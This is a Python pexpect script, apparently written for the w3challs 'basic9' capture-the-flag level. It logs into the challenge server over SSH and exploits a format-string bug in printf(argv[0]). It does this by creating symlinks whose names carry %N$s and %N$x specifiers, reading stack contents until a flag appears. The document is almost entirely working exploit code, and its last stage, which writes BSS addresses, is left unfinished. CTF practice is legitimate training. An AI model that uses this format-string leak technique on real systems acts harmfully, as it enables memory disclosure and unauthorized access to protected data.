#!/usr/bin/env python3

import pexpect
import sys

print("🔥💀 EXPLOIT FINAL - BINARY MODE 💀🔥")

# Conectar en modo binario para evitar errores de encoding
child = pexpect.spawn("ssh -o StrictHostKeyChecking=no -p 10101 basic9@pwn.w3challs.com", encoding=None, timeout=30)

# Login
child.expect([b'password:', b'Password:'])
child.sendline(b"basic9")
child.expect([b'\\$'])
print("[✓] Conectado!")

# El vulnerability: printf(argv[0]) cuando argc > 1
# Podemos controlar argv[0] creando symlinks

print("\n[*] Explotando format string vulnerability...")

# Ir a /tmp
child.sendline(b"cd /tmp")
child.expect([b'\\$'])

# Limpiar
child.sendline(b"rm -f x* 2>/dev/null")
child.expect([b'\\$'])

print("\n[*] Creando symlinks con format strings...")

# Probar posiciones del stack donde podría estar el password
for i in range(1, 50):
    print(f"[*] Probando posición {i}...")
    
    # Crear symlink con %s para leer string en posición i
    symlink = f'x%{i}$s'.encode()
    cmd = b"ln -sf /home/basic9/basic9 '" + symlink + b"'"
    child.sendline(cmd)
    child.expect([b'\\$'], timeout=2)
    
    # Ejecutar con un argumento para triggear el printf bug
    cmd = b"./'" + symlink + b"' dummy 2>&1"
    child.sendline(cmd)
    
    try:
        index = child.expect([b'\\$', b'Segmentation', b'W3C'], timeout=2)
        
        if index == 2:  # W3C encontrado!
            output = child.before
            print(f"\n🔥🔥🔥 FLAG ENCONTRADA EN POSICIÓN {i} 🔥🔥🔥")
            
            # Extraer la flag
            try:
                # Convertir a string ignorando errores
                output_str = output.decode('utf-8', errors='ignore')
            except:
                output_str = str(output)
            
            # Buscar el patrón W3C{...}
            import re
            match = re.search(r'W3C{[^}]+}', output_str)
            if match:
                print(f"\nFLAG: {match.group(0)}")
                break
            else:
                # Si no encuentra el patrón, imprimir todo
                print(f"Output: {output_str}")
                
        elif index == 1:  # Segfault
            print(f"  Segfault en posición {i}")
            
    except pexpect.TIMEOUT:
        pass
    except Exception as e:
        pass

# Si no encontramos con %s, probar con %x para ver el stack
print("\n[*] Si no se encontró, dumpeando stack con %x...")

for i in range(1, 20):
    symlink = f'y%{i}$x'.encode()
    cmd = b"ln -sf /home/basic9/basic9 '" + symlink + b"'"
    child.sendline(cmd)
    child.expect([b'\\$'], timeout=2)
    
    cmd = b"./'" + symlink + b"' dummy 2>&1 | grep -v 'Bad usage' | grep -v 'You must' | head -2"
    child.sendline(cmd)
    child.expect([b'\\$'], timeout=2)
    
    output = child.before
    try:
        output_str = output.decode('utf-8', errors='ignore')
        if output_str and len(output_str) > 5:
            lines = output_str.split('\n')
            for line in lines:
                if 'y%' in line and 'dummy' not in line:
                    print(f"Pos {i}: {line.strip()}")
    except:
        pass

# Técnica final: probar direcciones directas
print("\n[*] Probando direcciones directas del BSS...")

# En binarios de 32 bits, el BSS suele estar en 0x0804xxxx
addresses = [0x0804a040, 0x0804a060, 0x0804a080, 0x0804a0a0]

for addr in addresses:
    print(f"[*] Probando dirección {hex(addr)}...")
    
    # Necesitamos poner la dirección en el stack y luego leerla
    # Esto es más complejo, pero intentémoslo
    
    # Crear un archivo con la dirección
    cmd = f"echo -ne '\\x{(addr & 0xff):02x}\\x{((addr >> 8) & 0xff):02x}\\x{((addr >> 16) & 0xff):02x}\\x{((addr >> 24) & 0xff):02x}' > addr".encode()
    child.sendline(cmd)
    child.expect([b'\\$'], timeout=2)

child.close()
print("\n💀 FIN 💀")